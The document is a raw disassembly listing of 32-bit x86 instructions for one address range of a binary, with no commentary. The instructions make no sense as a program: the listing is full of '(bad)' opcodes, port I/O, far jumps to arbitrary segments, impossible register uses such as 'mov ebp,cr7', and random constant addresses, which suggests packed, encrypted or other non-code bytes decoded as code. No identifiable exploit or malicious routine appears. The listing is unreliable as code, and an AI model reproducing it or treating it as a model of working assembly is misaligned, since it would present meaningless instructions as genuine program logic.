  406115:	mov    ebp,ebp
  406117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406118:	scas   al,BYTE PTR es:[edi]
  406119:	add    eax,eax
  40611b:	pop    es
  40611c:	push   DWORD PTR [edi-0x79]
  40611f:	pop    ss
  406120:	pop    esi
  406121:	xchg   ebx,eax
  406122:	ret    
  406123:	repnz and DWORD PTR ds:[ecx+0x34],ebx
  406128:	pop    es
  406129:	xchg   edi,eax
  40612a:	push   eax
  40612b:	in     al,dx
  40612c:	pop    ecx
  40612d:	out    dx,al
  40612e:	or     BYTE PTR [edi],0xcc
  406131:	or     al,0x28
  406133:	sbb    ebp,DWORD PTR [ebp-0x23]
  406136:	push   ss
  406137:	in     eax,0x22
  406139:	aad    0x2f
  40613b:	sti    
  40613c:	fmul   QWORD PTR [edi]
  40613e:	stos   DWORD PTR es:[edi],eax
  40613f:	das    
  406140:	(bad)  
  406141:	outs   dx,DWORD PTR ds:[esi]
  406142:	jno    0x406196
  406144:	std    
  406145:	jg     0x406170
  406147:	(bad)  
  406148:	cwde   
  406149:	pop    eax
  40614a:	ret    0x2b44
  40614d:	(bad)  
  40614e:	fidiv  WORD PTR [edx]
  406150:	retf   
  406151:	stos   DWORD PTR es:[edi],eax
  406152:	dec    ecx
  406153:	jo     0x406158
  406155:	jecxz  0x40613b
  406157:	xor    al,0x30
  406159:	pop    ebx
  40615a:	arpl   ax,dx
  40615c:	adc    DWORD PTR [edx],0xffffffaa
  40615f:	jno    0x406132
  406161:	icebp  
  406162:	add    al,ah
  406164:	jecxz  0x4060f4
  406166:	jl     0x406117
  406168:	mov    edi,0x1625b880
  40616d:	jecxz  0x4061e4
  40616f:	adc    al,0x8
  406171:	clc    
  406172:	jl     0x4061e8
  406174:	scas   al,BYTE PTR es:[edi]
  406175:	cdq    
  406176:	push   cs
  406177:	std    
  406178:	jns    0x4061b6
  40617a:	mov    ds:0x942db024,eax
  40617f:	leave  
  406180:	fsubr  QWORD PTR [ebp+eiz*2-0x6467270f]
  406187:	mov    ah,0xf5
  406189:	loop   0x406203
  40618b:	sbb    DWORD PTR [edi],edx
  40618d:	sbb    DWORD PTR ds:0xa8c236e3,eax
  406193:	mov    bl,0xd7
  406196:	stos   BYTE PTR es:[edi],al
  406197:	cmp    DWORD PTR [esi+edx*4-0x61fd3172],ebp
  40619e:	push   ebx
  40619f:	jo     0x406200
  4061a1:	or     eax,0x833da0a7
  4061a6:	inc    edx
  4061a7:	stos   BYTE PTR es:[edi],al
  4061a8:	test   eax,0x5164f17
  4061ad:	push   ecx
  4061ae:	jne    0x406187
  4061b0:	mov    ch,0x91
  4061b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061b3:	lds    ebp,FWORD PTR [edi-0x26]
  4061b6:	icebp  
  4061b7:	out    0x99,al
  4061b9:	sbb    al,0xa
  4061bb:	mov    bh,BYTE PTR ds:0x40aa8472
  4061c1:	push   esp
  4061c2:	sbb    BYTE PTR [edx],bh
  4061c4:	mov    ecx,0xb61711ad
  4061c9:	inc    eax
  4061ca:	pusha  
  4061cb:	mov    eax,ds:0x173c2c74
  4061d0:	mov    bh,BYTE PTR [ebx+0x7abf5de4]
  4061d6:	sub    DWORD PTR [edi+0x2c7a5698],edx
  4061dc:	repnz test al,0x38
  4061df:	cmp    eax,0xb9e97eed
  4061e4:	sub    eax,esp
  4061e6:	push   ss
  4061e7:	inc    ebx
  4061e8:	call   0x75f7e263
  4061ed:	mov    al,bl
  4061ef:	movlps xmm2,QWORD PTR [edx]
  4061f2:	add    al,0xe5
  4061f4:	push   ss
  4061f5:	test   eax,0x9b0c3d7f
  4061fa:	push   cs
  4061fb:	add    ecx,DWORD PTR [edi-0xf2caf40]
  406201:	adc    DWORD PTR [ebx-0x46],ecx
  406204:	pop    edi
  406205:	out    0xb4,eax
  406207:	pop    esp
  406208:	sub    edi,ecx
  40620a:	retf   0xb222
  40620d:	mov    eax,ds:0x92f49c2c
  406212:	sbb    dh,bl
  406214:	scas   eax,DWORD PTR es:[edi]
  406215:	(bad)  
  406216:	je     0x406294
  406218:	xor    ebp,DWORD PTR [edx-0x444700d5]
  40621e:	shl    BYTE PTR ds:0x8e5d9a89,cl
  406224:	call   0x4ffc774f
  406229:	call   0x54b25536
  40622e:	and    DWORD PTR [esi],edi
  406230:	cmp    DWORD PTR [eax],ebx
  406232:	pop    ds
  406233:	(bad)  
  406234:	aam    0x44
  406236:	fucomp st(3)
  406238:	loopne 0x406288
  40623a:	adc    al,0x10
  40623c:	cwde   
  40623d:	outs   dx,DWORD PTR ds:[esi]
  40623e:	inc    eax
  40623f:	popf   
  406240:	mov    esi,0x9c90e76f
  406245:	mov    esp,0x2e68c14b
  40624a:	jae    0x40627f
  40624c:	outs   dx,BYTE PTR ds:[esi]
  40624d:	and    edi,DWORD PTR [edi-0x5ecdb61b]
  406253:	ja     0x40622e
  406255:	mov    BYTE PTR [edx+0x38a6a7c8],al
  40625b:	mov    DWORD PTR [ecx],ebx
  40625d:	or     al,0x16
  40625f:	(bad)  
  406260:	dec    ebp
  406261:	sbb    BYTE PTR [edi],dh
  406263:	dec    ebp
  406264:	inc    ebp
  406265:	lds    ebp,FWORD PTR [edi+0x736319c6]
  40626b:	rol    bl,0x3
  40626e:	or     BYTE PTR [edi-0x1e],ah
  406271:	sub    DWORD PTR [ebx+ebx*1],eax
  406274:	jae    0xc53973ae
  40627a:	ins    DWORD PTR es:[edi],dx
  40627b:	scas   eax,DWORD PTR es:[edi]
  40627c:	dec    esi
  40627d:	push   ebx
  40627e:	jnp    0x4062ec
  406280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406281:	mov    eax,0xe1e2769d
  406286:	fwait
  406287:	and    eax,0x1e434b6e
  40628c:	dec    esp
  40628d:	data16 cmp al,0x42
  406290:	xchg   ebp,eax
  406291:	mov    bh,0x90
  406293:	jnp    0x40626c
  406295:	or     eax,0xf975a7df
  40629a:	jo     0x4062d5
  40629c:	rcl    DWORD PTR [eax],1
  40629e:	sub    ebp,0xffffff89
  4062a1:	fwait
  4062a2:	cmp    dh,ch
  4062a4:	inc    esi
  4062a5:	repz jnp 0x4062e5
  4062a8:	sbb    esp,ebp
  4062aa:	mov    ds:0x47e5ba52,al
  4062af:	sub    ebx,0x2790b452
  4062b5:	aas    
  4062b6:	xor    BYTE PTR ds:0x2d0becca,bh
  4062bc:	scas   al,BYTE PTR es:[edi]
  4062bd:	shr    DWORD PTR [edx-0xf],0x13
  4062c1:	out    dx,eax
  4062c2:	xchg   BYTE PTR [ecx-0xe],bh
  4062c5:	std    
  4062c6:	inc    ecx
  4062c7:	adc    al,0xf8
  4062c9:	arpl   WORD PTR [eax],ax
  4062cb:	mov    ebp,0xec5e7f81
  4062d0:	sbb    al,0xb1
  4062d2:	ja     0x4062aa
  4062d4:	test   eax,0x3060561a
  4062d9:	into   
  4062da:	adc    esi,DWORD PTR [esi]
  4062dc:	and    esi,DWORD PTR [edx+0x1f1b12b9]
  4062e2:	or     esi,DWORD PTR [edi]
  4062e4:	lock jmp 0x1368:0xe5566410
  4062ec:	shl    BYTE PTR [eax-0x12185ff6],1
  4062f2:	cld    
  4062f3:	jl     0x4062f7
  4062f5:	aas    
  4062f6:	and    ch,0x48
  4062f9:	fisub  DWORD PTR [edx-0x34]
  4062fc:	cmp    dl,BYTE PTR [ecx]
  4062fe:	hlt    
  4062ff:	fsub   st(3),st
  406301:	pop    esp
  406302:	out    dx,eax
  406303:	pop    edx
  406304:	push   cs
  406305:	dec    esp
  406306:	cdq    
  406307:	shl    BYTE PTR [edi+0x33],1
  40630a:	fnstsw WORD PTR fs:[esi+0x2c]
  40630e:	mov    dl,0x28
  406310:	sahf   
  406311:	mov    BYTE PTR ss:[esi],al
  406314:	hlt    
  406315:	int3   
  406316:	jns    0x40634a
  406318:	cs fs cmp al,0x9b
  40631c:	sub    ebx,eax
  40631e:	push   ss
  40631f:	push   cs
  406320:	xchg   ebx,eax
  406321:	icebp  
  406322:	add    al,0xd2
  406324:	push   ds
  406325:	jp     0x406342
  406327:	dec    ecx
  406328:	lahf   
  406329:	lock and BYTE PTR [edi-0x36],0xe3
  40632e:	sbb    bh,BYTE PTR [ebx+0x58]
  406331:	xor    eax,0xb9241069
  406336:	jmp    0x21c4:0xdcabac16
  40633d:	jo     0x406393
  40633f:	stos   DWORD PTR es:[edi],eax
  406340:	retf   0xaf1
  406343:	aas    
  406344:	mov    ds:0xa7c8a841,al
  406349:	aaa    
  40634a:	pop    es
  40634b:	xor    ah,0xb
  40634e:	sbb    al,BYTE PTR [ecx+0x4b]
  406351:	outs   dx,BYTE PTR ds:[esi]
  406352:	push   eax
  406353:	cmp    eax,0xa3eda819
  406358:	dec    eax
  406359:	cmp    al,0x34
  40635b:	xlat   BYTE PTR ds:[ebx]
  40635c:	leave  
  40635d:	add    BYTE PTR [edx-0x4afc4a5e],cl
  406363:	sbb    eax,0x12452999
  406368:	es in  eax,0xf8
  40636b:	cmc    
  40636c:	cs inc edx
  40636e:	mov    WORD PTR ds:0x9a9546e0,es
  406374:	leave  
  406375:	outs   dx,BYTE PTR ds:[esi]
  406376:	xchg   edi,eax
  406377:	(bad)
  40637c:	jg     0x40632d
  40637e:	jmp    0xa1e0:0xdb8e9adf
  406385:	fstp   QWORD PTR [ecx+0x38]
  406388:	lds    eax,FWORD PTR [ebx]
  40638a:	xchg   BYTE PTR [edi],al
  40638c:	mov    ds:0xf9cabdef,eax
  406391:	xchg   ebx,eax
  406392:	push   0x7f
  406394:	into   
  406395:	stos   BYTE PTR es:[edi],al
  406396:	pusha  
  406397:	fistp  WORD PTR [edx-0x2704a4af]
  40639d:	pusha  
  40639e:	out    dx,eax
  40639f:	jp     0x406401
  4063a1:	imul   edi,edi,0xeffc9d46
  4063a7:	inc    edx
  4063a8:	mov    ecx,0x465fac79
  4063ad:	lods   eax,DWORD PTR ds:[esi]
  4063ae:	mov    eax,ds:0xddb6ac58
  4063b3:	ja     0x40637e
  4063b5:	clc    
  4063b6:	data16 fs cmc 
  4063b9:	adc    bh,BYTE PTR [edi+0x2e0377a0]
  4063bf:	push   eax
  4063c0:	call   0xc95f28f2
  4063c5:	ret    
  4063c6:	cmp    dl,BYTE PTR [edx+0x27]
  4063c9:	mov    bl,0x63
  4063cb:	and    al,0x3d
  4063cd:	push   cs
  4063ce:	pop    ebp
  4063cf:	(bad)  
  4063d0:	dec    esp
  4063d1:	neg    BYTE PTR [edx-0x3f3973ab]
  4063d7:	ins    BYTE PTR es:[edi],dx
  4063d8:	dec    ebx
  4063d9:	int3   
  4063da:	lea    ebp,ds:0x4a6a551d
  4063e0:	cs mov ecx,0x755fd256
  4063e6:	scas   al,BYTE PTR es:[edi]
  4063e7:	clc    
  4063e8:	pop    ebp
  4063e9:	sbb    DWORD PTR [edx],ebp
  4063eb:	push   ebx
  4063ec:	scas   al,BYTE PTR es:[edi]
  4063ed:	xchg   edx,eax
  4063ee:	xor    cl,BYTE PTR [ebx+0x3b]
  4063f1:	sub    al,0x71
  4063f3:	mov    dl,0xf5
  4063f5:	pop    ebx
  4063f6:	cs out 0x1a,eax
  4063f9:	mov    ah,0xff
  4063fb:	gs sbb al,0x91
  4063fe:	jnp    0x40643d
  406400:	dec    esp
  406401:	dec    esi
  406402:	jae    0x40638e
  406404:	push   edi
  406405:	pushf  
  406406:	adc    al,0x50
  406408:	cmc    
  406409:	mov    edi,0xd732ca52
  40640e:	out    dx,al
  40640f:	call   0x115b:0x656c08a9
  406416:	std    
  406417:	nop
  406418:	or     eax,DWORD PTR [ebx-0x7f]
  40641b:	jb     0x4063c5
  40641d:	jl     0x40648a
  40641f:	pop    esi
  406420:	mov    dh,BYTE PTR [eax-0x3]
  406423:	dec    esp
  406424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406425:	in     al,0x5e
  406427:	push   0xffffff8c
  406429:	pop    edi
  40642a:	leave  
  40642b:	jo     0x4063c6
  40642d:	dec    edi
  40642e:	test   cl,dl
  406430:	adc    eax,0xd1513b50
  406435:	(bad)  
  406436:	lock pop edx
  406438:	push   edi
  406439:	fisttp WORD PTR [edx-0x7a8dc727]
  40643f:	adc    eax,DWORD PTR [ecx-0x2097925a]
  406445:	push   ecx
  406446:	outs   dx,DWORD PTR ds:[esi]
  406447:	outs   dx,DWORD PTR ds:[esi]
  406448:	scas   al,BYTE PTR es:[edi]
  406449:	ja     0x40645b
  40644b:	lahf   
  40644c:	cld    
  40644d:	out    0x5d,al
  40644f:	and    DWORD PTR [ebp+ecx*1-0x26891013],eax
  406456:	leave  
  406457:	repz mov ebp,cr7
  40645b:	dec    ebp
  40645c:	stc    
  40645d:	push   edi
  40645e:	fdivr  st,st(3)
  406460:	jge    0x406475
  406462:	ret    
  406463:	xchg   esi,eax
  406464:	ror    BYTE PTR [edx-0x6b004e12],cl
  40646a:	adc    BYTE PTR [edi+0x7f],bl
  40646d:	adc    cl,BYTE PTR ss:[ebx+0x43]
  406471:	xchg   ebp,eax
  406472:	cmp    dh,BYTE PTR [ebp+edi*2+0x4d63c0af]
  406479:	xchg   BYTE PTR es:[ecx],dh
  40647c:	and    dh,cl
  40647e:	icebp  
  40647f:	dec    esp
  406480:	stc    
  406481:	add    ch,BYTE PTR [edi-0x3a]
  406484:	sbb    eax,0x1ddc62a4
  406489:	(bad)  
  40648b:	mov    cl,cl
  40648d:	push   edi
  40648e:	dec    ebp
  40648f:	dec    esi
  406490:	add    al,0x12
  406492:	xchg   esp,eax
  406493:	loopne 0x40646e
  406495:	xchg   ebp,eax
  406496:	out    0xf8,al
  406498:	xchg   edi,eax
  406499:	dec    esi
  40649a:	push   cs
  40649b:	sub    al,0x5a
  40649d:	sbb    bh,BYTE PTR [esi-0x74]
  4064a0:	push   esp
  4064a1:	ins    DWORD PTR es:[edi],dx
  4064a2:	and    eax,0xc1e3327e
  4064a7:	ja     0x406429
  4064a9:	lahf   
  4064aa:	xchg   edx,eax
  4064ab:	iret   
  4064ac:	or     BYTE PTR [ebx+0x76deb02a],0x19
  4064b3:	pop    esi
  4064b4:	pop    es
  4064b5:	xor    ch,cl
  4064b7:	push   ss
  4064b8:	jl     0x4064c6
  4064ba:	into   
  4064bb:	add    eax,0x42f227a4
  4064c0:	xlat   BYTE PTR ds:[ebx]
  4064c1:	mov    ds:0xd6b7c7ea,al
  4064c6:	dec    esp
  4064c7:	mov    al,0x76
  4064c9:	cld    
  4064ca:	repnz daa 
  4064cc:	cli    
  4064cd:	jmp    FWORD PTR [esi]
  4064cf:	loopne 0x40654e
  4064d1:	cmp    bl,dl
  4064d3:	adc    BYTE PTR ds:0xfb6e0677,bh
  4064d9:	pop    esi
  4064da:	int    0xdf
  4064dc:	mov    edx,0x93e391bb
  4064e1:	clc    
  4064e2:	mov    bl,0xca
  4064e4:	push   ecx
  4064e5:	cmp    eax,DWORD PTR [ebx]
  4064e7:	fcmovnb st,st(6)
  4064e9:	add    eax,0x66c0c17e
  4064ee:	cs jbe 0x4064ca
  4064f1:	add    al,0x9f
  4064f3:	lods   eax,DWORD PTR ds:[esi]
  4064f4:	jg     0x406572
  4064f6:	ins    BYTE PTR es:[edi],dx
  4064f7:	in     al,dx
  4064f8:	mov    ebx,0x3b40a6ef
  4064fd:	adc    al,0x93
  4064ff:	mov    bh,0xa2
  406501:	loopne 0x4064c5
  406503:	ins    BYTE PTR es:[edi],dx
  406504:	loopne 0x4064a5
  406506:	out    0xc1,eax
  406508:	sbb    esp,DWORD PTR [esi]
  40650a:	cmp    al,al
  40650c:	jg     0x4064f1
  40650e:	push   eax
  40650f:	sub    al,0x9e
  406511:	pop    esi
  406512:	cwde   
  406513:	fcmovb st,st(5)
  406515:	xchg   ebx,eax
  406516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406517:	xchg   edi,eax
  406518:	out    0xb7,eax
  40651a:	out    0x34,eax
  40651c:	dec    esi
  40651d:	dec    ebp
  40651e:	xchg   DWORD PTR [ebx],eax
  406520:	(bad)  [esp+ebx*8-0x2754fc7a]
  406527:	inc    ebx
  406528:	pop    es
  406529:	fdiv   DWORD PTR [esi-0x518f172d]
  40652f:	or     eax,0x64ea65d2
  406534:	out    dx,al
  406535:	loop   0x4064d5
  406537:	rcr    edi,0x9e
  40653a:	jecxz  0x406510
  40653c:	jo     0x406589
  40653e:	push   0xe5bb9b3b
  406543:	cdq    
  406544:	pop    edx
  406545:	mov    BYTE PTR [ebx],ah
  406547:	pop    edi
  406548:	in     ax,0xb7
  40654b:	xor    al,0xf6
  40654d:	(bad)  
  40654e:	fdivr  DWORD PTR [eax+0x42ab4e05]
  406554:	in     eax,0x8a
  406556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406557:	add    dl,dh
  406559:	cdq    
  40655a:	jno    0x4065b6
  40655c:	add    al,0x73
  40655e:	sbb    eax,0xeff4ab68
  406563:	mov    bl,0xa1
  406565:	or     ah,BYTE PTR [esp+eiz*8-0x68d08147]
  40656c:	pop    ecx
  40656d:	shl    ch,0xc2
  406570:	inc    ebx
  406571:	inc    edx
  406572:	loope  0x406564
  406574:	call   0x4957:0x858099bc
  40657b:	mov    edi,0x4cfc7768
  406580:	enter  0x7cf2,0x94
  406584:	das    
  406585:	add    al,ah
  406587:	add    ecx,DWORD PTR [ebp-0x1670d1c3]
  40658d:	bnd jnp 0x4065f3
  406590:	clc    
  406591:	sub    dh,BYTE PTR [ecx-0x7b7d0aa7]
  406597:	fsubp  st(1),st
  406599:	inc    edi
  40659a:	jmp    0x9e04:0xe9b4744
  4065a1:	dec    ebp
  4065a2:	into   
  4065a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065a4:	pop    ebp
  4065a5:	test   al,0xf6
  4065a7:	dec    ecx
  4065a8:	pop    ebp
  4065a9:	mov    DWORD PTR [ecx+0x1],ebx
  4065ac:	packsswb mm0,QWORD PTR [ebp+0x224d8f19]
  4065b3:	and    dl,al
  4065b5:	add    al,0x84
  4065b7:	imul   edi,DWORD PTR ds:0xc599f748,0x47
  4065be:	add    al,BYTE PTR [eax-0x3cc10b58]
  4065c4:	dec    esp
  4065c5:	sub    eax,0xa2aa7bd7
  4065ca:	adc    eax,DWORD PTR [edx+0x49]
  4065cd:	mov    ?,WORD PTR [ecx-0x180cc38e]
  4065d3:	pop    esi
  4065d4:	aam    0x73
  4065d6:	lock or al,0x20
  4065d9:	push   cs
  4065da:	fsub   QWORD PTR [ecx+ecx*1]
  4065dd:	adc    eax,0xf72f75de
  4065e2:	inc    ecx
  4065e3:	jnp    0x4065a5
  4065e5:	xor    esi,DWORD PTR ds:0xc220b7b1
  4065eb:	out    dx,al
  4065ec:	xchg   ebx,eax
  4065ed:	out    0x9e,al
  4065ef:	mov    ebx,0xf5f3e87e
  4065f4:	mov    bl,0xae
  4065f6:	mov    ebp,0xc6023cb7
  4065fb:	mov    al,ds:0xa78f826a
  406600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406601:	out    0xf7,eax
  406603:	and    DWORD PTR [ecx+0x79],0x3
  406607:	xor    eax,0x69f7a79c
  40660c:	imul   DWORD PTR [ecx+0x8]
  40660f:	popa   
  406610:	ret    0xe368
  406613:	sbb    dl,al
  406615:	inc    eax
  406616:	loope  0x4065c5
  406618:	dec    esp
  406619:	sub    bl,BYTE PTR ds:0x2ccf478d
  40661f:	pushw  0xd9e4
  406623:	iret   
  406624:	les    esp,FWORD PTR [ebx]
  406626:	bound  edi,QWORD PTR [ebp-0x45]
  406629:	mov    esi,ebp
  40662b:	push   0x9f4356e6
  406630:	pop    ebp
  406631:	mov    dh,0x3d
  406633:	sbb    eax,0x87472f1a
  406638:	or     al,0xf0
  40663b:	push   es
  40663c:	push   cs
  40663d:	pop    edi
  40663e:	push   ebx
  40663f:	mov    al,0x93
  406641:	cmp    BYTE PTR [esi],ah
  406643:	or     ecx,DWORD PTR [edi+0x26]
  406646:	repz enter 0x878c,0x13
  40664b:	add    al,0x65
  40664d:	lock sub dh,BYTE PTR [ebx]
  406650:	std    
  406651:	inc    eax
  406652:	out    dx,eax
  406653:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406654:	sub    edi,ebx
  406656:	sbb    ah,ch
  406658:	(bad)  
  406659:	fdivr  DWORD PTR [edx]
  40665b:	stos   BYTE PTR es:[edi],al
  40665c:	test   eax,0xda9a6245
  406661:	nop
  406662:	pop    esi
  406663:	inc    ebp
  406664:	dec    ebx
  406665:	out    0xa7,eax
  406667:	aas    
  406668:	jnp    0x4065f2
  40666a:	arpl   WORD PTR [edi],di
  40666c:	imul   esp,DWORD PTR [edi-0x22],0xf38f039f
  406673:	in     eax,dx
  406674:	in     eax,dx
  406675:	adc    BYTE PTR [eax],cl
  406677:	inc    esi
  406678:	mov    ds:0xcd586984,eax
  40667d:	out    0x2e,eax
  40667f:	(bad)  
  406680:	loopne 0x406659
  406682:	pop    eax
  406683:	fbld   TBYTE PTR ds:0x63f569a5
  406689:	mov    ds:0xcb0c58b,eax
  40668e:	popf   
  40668f:	adc    DWORD PTR [edx+0x42da5591],ecx
  406695:	daa    
  406696:	sub    edi,DWORD PTR [edi]
  406698:	adc    esp,eax
  40669a:	jo     0x4066bf
  40669c:	jge    0x406623
  40669e:	push   cs
  40669f:	nop
  4066a0:	or     ebx,DWORD PTR [ebx-0x4a]
  4066a3:	push   cs
  4066a4:	mov    ebp,0xe774597a
  4066a9:	inc    edx
  4066aa:	ret    0x6f97
  4066ad:	jle    0x4066ed
  4066af:	test   BYTE PTR ds:0xb7999ee2,ah
  4066b5:	std    
  4066b6:	sub    al,0x5a
  4066b8:	pushw  0x5987
  4066bc:	pop    ds
  4066bd:	mov    eax,0x4a050280
  4066c2:	(bad)  
  4066c3:	icebp  
  4066c4:	fsubr  DWORD PTR [edx-0x2e]
  4066c7:	mov    edx,0x589cc924
  4066cc:	mov    bl,0x53
  4066ce:	cld    
  4066cf:	mov    ch,0x73
  4066d1:	push   edx
  4066d2:	aaa    
  4066d3:	mov    bl,0x86
  4066d5:	gs retf 0x9c28
  4066d9:	mov    ds:0xfc9b81c4,al
  4066de:	jg     0x4066fa
  4066e0:	sti    
  4066e1:	jecxz  0x406686
  4066e3:	cmp    ebp,DWORD PTR [esi+0x5f]
  4066e6:	bound  ebp,QWORD PTR [ecx]
  4066e8:	aad    0x7b
  4066ea:	jns    0x4066f2
  4066ec:	(bad)  
  4066ed:	arpl   si,cx
  4066ef:	sbb    eax,DWORD PTR ds:0x248beb3f
  4066f5:	mov    esi,0xbce6ebae
  4066fa:	call   0x8a88:0x981d437
  406701:	xor    al,BYTE PTR [eax-0x2856616e]
  406707:	pop    esp
  406708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406709:	in     eax,0xe0
  40670b:	int    0x1d
  40670d:	es push esp
  40670f:	rol    BYTE PTR [edi+0x3a],cl
  406712:	(bad)  
  406714:	clc    
  406715:	xchg   esp,eax
  406716:	push   edi
  406717:	outs   dx,BYTE PTR ds:[esi]
  406718:	(bad)  
  406719:	int    0xbf
  40671b:	je     0x40677e
  40671d:	push   0xffffffed
  40671f:	inc    ecx
  406720:	out    dx,al
  406721:	repz push ss
  406723:	mov    cl,0x40
  406725:	loop   0x40677f
  406727:	cmp    eax,0xaf87ee1d
  40672c:	outs   dx,DWORD PTR ds:[esi]
  40672d:	cmp    cl,BYTE PTR [edi+ecx*1-0x1a]
  406731:	xchg   ebp,eax
  406732:	mov    eax,ds:0x3871d2e2
  406737:	bound  esi,QWORD PTR [ebx]
  406739:	pop    edi
  40673a:	mov    ss,WORD PTR [eax]
  40673c:	mov    ebp,0xf326db45
  406741:	sbb    bl,BYTE PTR [esi]
  406743:	mov    esp,ecx
  406745:	imul   ebx,DWORD PTR [edx],0x79
  406748:	sub    ebp,DWORD PTR [ebp-0x11]
  40674b:	hlt    
  40674c:	cmp    cl,BYTE PTR [esi-0x6a470689]
  406752:	jo     0x40676c
  406754:	and    al,0x1f
  406756:	push   ecx
  406757:	or     ah,BYTE PTR [ecx+eiz*8-0x102cd38d]
  40675e:	leave  
  40675f:	pop    es
  406760:	ja     0x4066fb
  406762:	mov    dl,0x3d
  406764:	out    dx,eax
  406765:	sbb    eax,0xd676270c
  40676a:	ror    cl,0x85
  40676d:	les    esi,FWORD PTR [esi+0x3fafd17a]
  406773:	pusha  
  406774:	push   ds
  406775:	xchg   BYTE PTR [eax],al
  406777:	sbb    DWORD PTR [edx+edi*8],0xffffffba
  40677b:	dec    esi
  40677c:	lahf   
  40677d:	pop    ebx
  40677e:	mov    DWORD PTR [edx+0x74b3a019],esp
  406784:	add    edx,DWORD PTR [eax+ebp*2-0x2f]
  406788:	adc    DWORD PTR [ecx],0x2c
  40678b:	loope  0x40670f
  40678d:	pop    ds
  40678e:	in     al,dx
  40678f:	fadd   QWORD PTR [ecx]
  406791:	dec    edi
  406792:	mov    ecx,0x987cdb77
  406797:	add    DWORD PTR [edi-0xf],0xf960b57
  40679e:	xor    ah,BYTE PTR [ebx-0x48]
  4067a1:	jecxz  0x4067d7
  4067a3:	cli    
  4067a4:	fstp   DWORD PTR [eax]
  4067a6:	sbb    DWORD PTR [edx+0x71],0x41
  4067aa:	inc    ebp
  4067ab:	fadd   DWORD PTR [eax+0x7d6ff9d9]
  4067b1:	add    eax,0xcda75ff2
  4067b6:	ja     0x4067f7
  4067b8:	mov    al,0xd8
  4067ba:	cmp    BYTE PTR [edx+ebp*4],bh
  4067bd:	xchg   ecx,eax
  4067be:	in     eax,dx
  4067bf:	fstp   DWORD PTR [eax]
  4067c1:	clc    
  4067c2:	push   cs
  4067c3:	popf   
  4067c4:	daa    
  4067c5:	arpl   dx,cx
  4067c7:	in     al,0x94
  4067c9:	mov    esp,0x461d7878
  4067ce:	add    ebp,DWORD PTR [esi+0x2d97d70e]
  4067d4:	dec    esi
  4067d5:	xor    eax,0x41dc8e7e
  4067da:	pusha  
  4067db:	inc    esp
  4067dc:	add    BYTE PTR [edx-0x6a],0x9a
  4067e0:	jl     0x4067cc
  4067e2:	out    dx,eax
  4067e3:	cmp    dl,BYTE PTR [ebp-0x50]
  4067e6:	(bad)  
  4067e7:	push   eax
  4067e8:	push   edx
  4067e9:	xor    BYTE PTR [esi-0x36],0xfd
  4067ed:	or     bl,BYTE PTR [eax+0x74]
  4067f0:	es sbb eax,0x84acf57c
  4067f6:	lea    ebp,[ebx+ecx*4]
  4067f9:	bound  edi,QWORD PTR [ebx-0x20]
  4067fc:	outs   dx,BYTE PTR ds:[esi]
  4067fd:	push   ebp
  4067fe:	pop    es
  4067ff:	inc    edi
  406800:	or     DWORD PTR [esi],ebx
  406802:	push   ebp
  406803:	add    al,0xa9
  406805:	das    
  406806:	sar    BYTE PTR [ebx-0x5ceff88e],cl
  40680c:	sbb    al,0x1b
  40680e:	mov    WORD PTR [eax-0x6710fab1],ds
  406814:	mov    esp,0x819f6527
  406819:	jge    0x4067f4
  40681b:	sar    BYTE PTR [ebx-0x80],0x2c
  40681f:	das    
  406820:	xor    cl,BYTE PTR [ebx+0x72eb6150]
  406826:	call   0xa2d1:0x172e8a91
  40682d:	add    al,BYTE PTR [ebp+0x6246b326]
  406833:	fisub  DWORD PTR [edx+0x40]
  406836:	mov    bl,0x86
  406838:	inc    ebx
  406839:	and    eax,DWORD PTR [ecx]
  40683b:	ss clc 
  40683d:	retf   0x8414
  406840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406841:	sub    ch,bh
  406843:	gs push ebx
  406845:	pop    ebp
  406846:	mov    ds:0xf9cfae4b,eax
  40684b:	lods   al,BYTE PTR ds:[esi]
  40684c:	jecxz  0x40684a
  40684e:	loop   0x40685b
  406850:	add    al,0x5
  406852:	scas   al,BYTE PTR es:[edi]
  406853:	mul    bh
  406855:	mov    dl,0xb6
  406857:	jne    0x406854
  406859:	sub    esp,DWORD PTR ds:0xc0809e1e
  40685f:	push   esp
  406860:	push   es
  406861:	lock addr16 add eax,0xbffca136
  406869:	adc    DWORD PTR [eax+edi*4],ebx
  40686c:	gs ja  0x40686d
  40686f:	adc    al,0x5
  406871:	adc    bl,bh
  406873:	jge    0x406822
  406875:	test   al,0x71
  406877:	or     eax,0x5b4836f5
  40687c:	or     ebp,DWORD PTR [edi]
  40687e:	out    0xbe,al
  406880:	and    ecx,esi
  406882:	jge    0x4068f6
  406884:	push   edi
  406885:	int3   
  406886:	out    0xc4,eax
  406888:	inc    ebp
  406889:	ss jnp 0x4068f3
  40688c:	pop    edi
  40688d:	(bad)  
  40688e:	jnp    0x406888
  406890:	xchg   esi,eax
  406891:	mov    ah,0xbf
  406893:	mov    ebp,0x3066c686
  406898:	push   ebp
  406899:	jle    0x4068d7
  40689b:	fdivrp st(2),st
  40689d:	int3   
  40689e:	fbld   TBYTE PTR [edx-0x1f]
  4068a1:	xor    eax,0x5f5df561
  4068a6:	mov    esp,0x60c61f6a
  4068ab:	cmp    ecx,ecx
  4068ad:	xchg   DWORD PTR [ecx],ecx
  4068af:	and    DWORD PTR [edi-0x4480c3d],esi
  4068b5:	inc    edx
  4068b6:	stos   BYTE PTR es:[edi],al
  4068b7:	jmp    0x3b7ab3f1
  4068bc:	xchg   esp,eax
  4068bd:	xchg   BYTE PTR [eax-0x6a19ecd],dl
  4068c3:	mov    edi,0xfd941b99
  4068c8:	inc    ecx
  4068c9:	mov    edi,?
  4068cb:	mov    dh,BYTE PTR [eax+0xe]
  4068ce:	jne    0x406919
  4068d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068d1:	cmp    al,0x56
  4068d3:	(bad)  
  4068d4:	loope  0x406872
  4068d6:	cmp    ebx,DWORD PTR [ebx]
